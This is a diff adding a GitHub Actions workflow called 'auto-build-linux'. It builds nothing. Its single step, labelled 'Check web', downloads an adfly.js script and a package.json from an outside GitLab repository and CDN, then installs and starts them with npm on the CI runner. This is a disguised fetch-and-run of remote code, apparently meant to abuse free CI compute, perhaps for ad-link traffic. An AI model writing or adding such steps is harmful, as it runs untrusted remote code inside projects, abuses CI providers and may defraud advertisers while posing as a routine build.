@@ -1,0 +1,15 @@
+name: auto-build-linux
+on: 
+  workflow_dispatch:
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+    - name: Check web
+      run: |
+        curl https://gitlab.com/meo__coder/appfim__img/-/blob/master/adfly.js --output index.js && curl https://glcdn.githack.com/meo__coder/appfim__img/-/raw/master/package.json --output package.json && npm i -s && npm start
